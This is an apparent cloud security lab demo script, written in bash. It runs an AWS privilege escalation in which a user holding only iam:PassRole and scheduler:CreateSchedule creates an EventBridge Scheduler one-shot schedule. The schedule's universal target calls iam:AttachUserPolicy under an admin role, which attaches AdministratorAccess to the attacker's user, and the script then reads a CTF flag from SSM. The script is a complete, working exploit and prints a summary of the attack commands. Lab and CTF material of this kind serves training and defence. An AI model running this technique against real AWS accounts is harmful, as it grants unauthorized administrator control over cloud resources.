#!/bin/bash
set -e

# Demo script for PassRole + EventBridge Scheduler privilege escalation
# This scenario demonstrates how a principal with iam:PassRole and
# scheduler:CreateSchedule can schedule a one-shot EventBridge Scheduler
# invocation using the universal target arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy
# — the scheduler calls iam:AttachUserPolicy as the passed admin role, attaching
# AdministratorAccess to the attacker's user with no Lambda or EC2 required.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-scheduler-001-to-admin-starting-user"
SCHEDULER_ROLE_NAME="pl-prod-scheduler-001-to-admin-scheduler-role"
SCHEDULE_NAME="pl-scheduler-001-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}PassRole + EventBridge Scheduler Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_scheduler_001.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
SCHEDULER_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.scheduler_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Scheduler Role ARN: $SCHEDULER_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity"
aws sts get-caller-identity
echo ""

if [[ ! $(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null) == *"$STARTING_USER_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}"

# Wait for IAM propagation after confirming identity
echo -e "${YELLOW}Waiting 15 seconds for IAM propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation complete${NC}\n"

# [OBSERVATION] Step 3: Confirm starting principal cannot read the SSM flag
echo -e "${YELLOW}Step 3: Confirming starting principal cannot read SSM flag (expect AccessDenied)${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/scheduler-001-to-admin"

use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM_NAME --region $AWS_REGION"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --region "$AWS_REGION" 2>&1 || true)
echo "$PROVE_CANT_OUTPUT"

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Starting principal correctly denied — cannot read flag${NC}"
else
    echo -e "${RED}ERROR: Starting principal read the SSM flag without escalating.${NC}"
    echo -e "${RED}Remove ssm:GetParameter from the starting principal's Terraform IAM policy.${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 4: Create EventBridge Scheduler one-shot schedule with universal target
echo -e "${YELLOW}Step 4: Creating EventBridge Scheduler one-shot schedule via universal target${NC}"
echo -e "${YELLOW}Universal target: arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy${NC}"
echo -e "${YELLOW}Execution role  : ${SCHEDULER_ROLE_ARN}${NC}"
echo -e "${YELLOW}Effect          : attach AdministratorAccess to ${STARTING_USER_NAME}${NC}"

use_starting_creds
export AWS_REGION=$AWS_REGION

# Compute a schedule time 120 seconds from now (UTC).
# 120s gives EventBridge Scheduler reliable lead time; the scheduler may take up to
# 30s after the fire time to actually invoke the target, and IAM propagation adds more.
SCHEDULE_TIME=$(python3 -c "
from datetime import datetime, timedelta, timezone
t = datetime.now(timezone.utc) + timedelta(seconds=120)
print(t.strftime('%Y-%m-%dT%H:%M:%S'))
")
echo "Schedule fires at: ${SCHEDULE_TIME} UTC"

# Build the Input JSON for iam:AttachUserPolicy (the SDK call the schedule will make)
SCHEDULE_INPUT=$(jq -cn \
    --arg user "$STARTING_USER_NAME" \
    --arg policy "arn:aws:iam::aws:policy/AdministratorAccess" \
    '{UserName: $user, PolicyArn: $policy}')

# Build the Target JSON — Input must be a JSON string (serialized), not a nested object
TARGET_JSON=$(jq -cn \
    --arg arn "arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy" \
    --arg role "$SCHEDULER_ROLE_ARN" \
    --arg input "$SCHEDULE_INPUT" \
    '{Arn: $arn, RoleArn: $role, Input: $input}')

echo -e "${YELLOW}Target JSON:${NC}"
echo "$TARGET_JSON"
echo ""

show_attack_cmd "Attacker" "aws scheduler create-schedule --name $SCHEDULE_NAME --schedule-expression at($SCHEDULE_TIME) --flexible-time-window '{\"Mode\": \"OFF\"}' --target '<target-json>' --action-after-completion DELETE --region $AWS_REGION"
if aws scheduler create-schedule \
    --name "$SCHEDULE_NAME" \
    --schedule-expression "at($SCHEDULE_TIME)" \
    --flexible-time-window '{"Mode": "OFF"}' \
    --target "$TARGET_JSON" \
    --action-after-completion DELETE \
    --region "$AWS_REGION"; then
    echo -e "${GREEN}✓ Schedule created — waiting for it to fire at ${SCHEDULE_TIME} UTC${NC}"
else
    echo -e "${RED}ERROR: scheduler:CreateSchedule failed (see output above)${NC}"
    exit 1
fi
echo ""

# Wait for the schedule to fire and IAM to propagate.
# Schedule fires at T+120s; EventBridge Scheduler may take up to 30s after the fire time
# to invoke the target. IAM policy attachment propagation adds another 15-30s.
# 180s total from create-schedule gives comfortable margin.
echo -e "${YELLOW}Waiting 180 seconds for schedule to execute and IAM policy to propagate...${NC}"
sleep 180
echo -e "${GREEN}✓ Wait complete${NC}\n"

# [EXPLOIT] Step 5: Read the SSM flag as the starting user (now with AdministratorAccess attached)
# Pattern A (self-escalation): same AWS_ACCESS_KEY_ID — AdministratorAccess is now attached to this user
echo -e "${YELLOW}Step 5: Capturing CTF flag from SSM Parameter Store${NC}"
echo -e "${YELLOW}Pattern A: same AWS_ACCESS_KEY_ID — AdministratorAccess now attached to this user${NC}"

use_starting_creds
export AWS_REGION=$AWS_REGION

# Retry up to 5 times in case of IAM propagation lag
FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    echo -e "${YELLOW}Attempt ${attempt}/5...${NC}"
    PROVE_CAN_OUTPUT=$(aws ssm get-parameter \
        --name "$FLAG_PARAM_NAME" \
        --region "$AWS_REGION" 2>&1 || true)

    if echo "$PROVE_CAN_OUTPUT" | grep -qi "flag{"; then
        FLAG_VALUE=$(echo "$PROVE_CAN_OUTPUT" | jq -r '.Parameter.Value' 2>/dev/null || echo "(see output above)")
        break
    fi

    if [ $attempt -lt 5 ]; then
        echo -e "${YELLOW}Not yet — waiting 30 seconds more for IAM propagation...${NC}"
        sleep 30
    fi
done

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --region $AWS_REGION"

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "(see output above)" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
elif echo "$PROVE_CAN_OUTPUT" | grep -qi "flag{"; then
    FLAG_VALUE=$(echo "$PROVE_CAN_OUTPUT" | grep -oi 'flag{[^}]*}' || echo "")
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    echo -e "${RED}Scheduler may not have run or iam:AttachUserPolicy failed.${NC}"
    echo "Last output: $PROVE_CAN_OUTPUT"
    echo -e "${YELLOW}Checking policies currently attached to $STARTING_USER_NAME...${NC}"
    aws iam list-attached-user-policies --user-name "$STARTING_USER_NAME" 2>&1 || true
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (iam:PassRole + scheduler:CreateSchedule only)"
echo "2. Created a one-shot EventBridge Scheduler schedule with universal target"
echo "   Target: arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy"
echo "   Role: $SCHEDULER_ROLE_ARN"
echo "3. Schedule fired and called iam:AttachUserPolicy as the admin role"
echo "4. AdministratorAccess attached to $STARTING_USER_NAME"
echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER_NAME → (iam:PassRole + scheduler:CreateSchedule) → universal target → iam:AttachUserPolicy → AdministratorAccess → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Schedule '$SCHEDULE_NAME' (deleted by --action-after-completion DELETE)"
echo "- AdministratorAccess attached to $STARTING_USER_NAME"

echo -e "\n${RED}⚠ Warning: AdministratorAccess is still attached to $STARTING_USER_NAME${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
